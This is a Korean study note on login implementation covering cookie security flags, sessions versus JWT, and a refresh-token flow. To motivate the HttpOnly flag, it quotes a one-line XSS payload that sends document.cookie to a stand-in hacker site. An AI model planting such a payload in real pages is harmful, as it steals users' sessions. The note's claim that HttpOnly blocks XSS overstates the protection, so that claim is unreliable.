## **로그인 구현하기** 

### 1. Cookie에 대한 이해 
- 쿠키는 HTTP통신을 이용하는 서버 어디에서든지 쿠키를 주고 받을 수 있으며 클라이언트에서도 쿠키에 접근하고 관리할 수 있다.
- HTTP는 기본적으로 상태정보를 기억하지 못하기 때문에, 서버는 요청자가 누구인지, 같은 사람인지 식별할 수 없다.
- 이러한 문제를 해결하기 위해, 서버는 사용자의 식별정보를 쿠키에 저장하며, 쿠키에 저장된 정보를 통해 각 사용자를 구별한다.
- 수많은 사이트들에서 민감한 개인정보를 쿠키에 저장하고 있으며, 해커들은 다양한 방법으로 이 쿠키를 탈취하고자 하므로 보안에 신경을 써야 된다.

### 2. HTTP Only Cookies

쿠키는 클라이언트에서 자바스크립트로 조회할 수 있기 떄문에, 해커들은 자바스크립트로 쿠키를 가로채고자 시도를 하게 된다. 가장 대표적인 공격 중 하나가 CSS(Cross Site Scripting)이다. 
```jsx
location.href = "http://해커사이트/?cookies=" + document.cookie;
```
해커가 이와 같은 게시물을 공개게시판에 작성할 경우, 이 게시물을 읽은 다른 사용자는 알아차리기도 전에 자신의 모든 쿠키를 해커에게 전송하게 된다.

이러한 취약점을 해결하는 방법은, 바로 브라우저에서 쿠키에 접근할 수 없도록 제한하는 것이다. 이러한 역할을 하는 것이 바로 HTTP Only Cookie이다. 개발자가 다음과 같이 간단한 접미사를 쿠키 생성코드에 추가함으로써 활성화할 수 있다.
```jsx
Set-Cookie: 쿠키명 = 쿠기값; path=/; HttpOnly
```
가장 마지막에 HttpOnly라는 접미사만 추가함으로써 HTTP Only Cookie가 활성화 되며, 위에서 말한 XSS와 같은 공격이 차단되게 된다. HTTP Only Cookie를 설정하면 브라우저에서 해당 쿠키로 접근할 수 없게 되지만, 쿠키에 포함된 정보의 대부분이 브라우저에서 접근할 필요가 없기 때문에 HTTP Only Cookie는 기본적으로 적용하는 것이 좋다.

### 3. Secure Cookies
HTTP Only Cookie를 이용하면 Client에서 Javascript를 통한 쿠키 탈취문제를 예방할 수 있다. 하지만 Javascript가 아닌 네트워크를 직접 감청하여 쿠키를 가로챌 수 있다. 이러한 통신상의 정보유출을 막기위해 HTTPS 프로토콜을 사용하여 데이터를 암호화하는 방법이 주로 사용되고 있다. HTTPS를 사용하면 쿠키 또한 암호화되어 전송되기 때문에, 제 3자는 내용을 알 수 없다.

문제는 HTTPS로 전송되어야 할 정보가, 개발자의 부주의로 HTTP를 통해 유출되는 경우가 있다. 예를 들어 개발자가 다음과 같은 코드를 실수로 작성할 수 있다.
```jsx
<img src="http://www.example.com/images/logo.png" />
```
브라우저는 http://로 시작되는 위 코드를 만나면 암호화되지 않은 상태로 쿠키를 서버로 전달하게 됩니다. 해커는 이 암호화되지 않은 요청정보를 가로채서 쿠키를 탈취하게 됩니다.

이러한 사고를 방지하는 방법은 쿠키를 생성할 때 secure 접미사를 사용하는 것이다.
```jsx
Set-Cookie: 쿠키명=쿠키값; path=/; secure
```
위와 같이 마지막에 secure라는 접미사를 사용하여 쿠키를 생성하면, 브라우저는 HTTPS가 아닌 통신에서는 쿠키를 전송하지 않는다.

### 4. Session vs JWT(Json web Token)

**1.Sesstion(세션)**
- 전통적으로 많이 사용되어 온 방식으로, 서버 기반 인증방법이다.
- 세션 id를 사용해서 어떤 사용자가 서버에 로그인 되어있음이 지속되는 상태를 '세션'이라고 한다.
1. 사용자가 로그인에 성공하면 세션을 발행한다.
2. 그 세션을 브라우저에도 저장하고 서버 메모리에도 저장한다.
3. 인가가 필요한 요청을 보낼 때 서버에 세션값을 같이 보냄
4. 서버는 메모리에 저장된 값과 세션값을 비교해서 맞는 값이 있으면 성공

**단점은?**
- 세션이 서버에 저장되어 있기 때문에 사용자가 동시 다중 접속할 떄 메모리가 부족해진다.
- 확장성 부분에서 분산된 서버의 경우 세션 유지가 제대로 안되기 때문에 서버 확장이 어렵다.

**2. JWT (JSON Web Token)**
- 사용자가 로그인을 하면 토큰을 주는데, 이 토큰을 서버가 기억하고 있지는 않는다.(stateless)
- 세션을 대체하지 못하는 이유는 모든 사용자의 상태를 기억하고 있지 않는다.
- JWT는 이미 제공한 토큰을 뺏을 수 없어서 해커에게 토큰을 빼앗겨도 톸느을 무효화할 방법이 없음 => accessToken, refreshToken 두개의 토큰을 제공해야 한다.

### JWT 예제
1. [프론트엔드] ID와 비밀번호를 준다.

2. [백엔드] ID와 비밀번호를 검증하고 AccessToken과 RefreshToken, AccessToken의 만료시간을 반환해준다. 이 때 생성한 RefreshToken은 DB에 {ID,RefreshToken}으로 저장한다.

3. [프론트엔드] 반환받은 AccessToken을 매 api 호출마다 헤더에 붙여서 전송한다.

4. [백엔드] api호출시 헤더의 AccessToken을 확인하고 유효한지, 만료기간이 지났는지를 체크 후 api를 동작시킨다.

5. [프론트엔드] AccessToken의 만료 기간이 지나거나, 30초 미만으로 남았다면, 백엔드에 RefreshToken을 붙여 Reissue 요청을 보낸다.

6. [백엔드] Reissue요청이 들어올 경우, RefreshToken이 DB에 있는 것인지 확인한 후, 맞다면 AccessToken과 새로운 AccessToken 만료 시간을 반환한다.

7. [프론트엔드] Reissue결과 반환된 AccessToken과 만료기간을 저장하여 다음 api호출에 사용한다.

### 참고
1. <a href="https://velog.io/@yaytomato/%ED%94%84%EB%A1%A0%ED%8A%B8%EC%97%90%EC%84%9C-%EC%95%88%EC%A0%84%ED%95%98%EA%B2%8C-%EB%A1%9C%EA%B7%B8%EC%9D%B8-%EC%B2%98%EB%A6%AC%ED%95%98%EA%B8%B0#-%EB%A1%9C%EA%B7%B8%EC%9D%B8%EC%9D%80-%EC%96%B4%EB%96%BB%EA%B2%8C-%EC%9D%B4%EB%A3%A8%EC%96%B4%EC%A7%80%EB%82%98">https://velog.io/@yaytomato/</a>
2. https://nsinc.tistory.com/121
